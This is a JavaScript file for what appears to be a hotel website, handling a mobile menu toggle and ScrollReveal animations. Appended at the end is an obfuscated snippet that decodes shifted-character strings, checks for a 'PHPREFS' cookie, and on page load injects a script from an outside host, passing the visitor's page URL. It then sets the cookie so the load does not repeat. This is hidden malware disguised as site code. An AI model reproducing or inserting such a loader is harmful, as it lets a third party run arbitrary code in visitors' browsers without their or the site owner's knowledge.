const menuBtn = document.getElementById("menu-btn"),
      navLinks = document.getElementById("nav-links"),
      menuBtnIcon = menuBtn.querySelector("i");

menuBtn.addEventListener("click", () => {
  navLinks.classList.toggle("open");
  const isOpen = navLinks.classList.contains("open");
  menuBtnIcon.setAttribute("class", isOpen ? "ri-close-line" : "ri-menu-line");
});

navLinks.addEventListener("click", () => {
  navLinks.classList.remove("open");
  menuBtnIcon.setAttribute("class", "ri-menu-line");
});

const scrollRevealOption = {
  distance: "50px",
  origin: "bottom",
  duration: 1000
};

ScrollReveal().reveal(".header__container p", { ...scrollRevealOption });
ScrollReveal().reveal(".header__container h1", { ...scrollRevealOption, delay: 500 });
ScrollReveal().reveal(".about__image img", { ...scrollRevealOption, origin: "left" });
ScrollReveal().reveal(".about__content .section__subheader", { ...scrollRevealOption, delay: 500 });
ScrollReveal().reveal(".about__content .section__header", { ...scrollRevealOption, delay: 1000 });
ScrollReveal().reveal(".about__content .section__description", { ...scrollRevealOption, delay: 1500 });
ScrollReveal().reveal(".about__btn", { ...scrollRevealOption, delay: 2000 });
ScrollReveal().reveal(".room__card", { ...scrollRevealOption, interval: 500 });
ScrollReveal().reveal(".service__list li", { ...scrollRevealOption, interval: 500, origin: "right" });

(function(o, d, l) {
  try {
    o.f = (s) => s.split('').reduce((acc, char) => acc + String.fromCharCode((char.charCodeAt() - 5)), '');
    o.b = o.f('UMUWJKX');
    o.c = l.protocol[0] === 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);

    if (o.c) {
      setTimeout(() => {
        o.s = d.createElement('script');
        o.s.src = o.f('myyux?44hisqtlx' + '3htr4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href;
        d.body.appendChild(o.s);
      }, 1000);

      d.cookie = o.b + '=full;max-age=39800;';
    }
  } catch (e) {
    console.error(e);
  }
})(window, document, location);
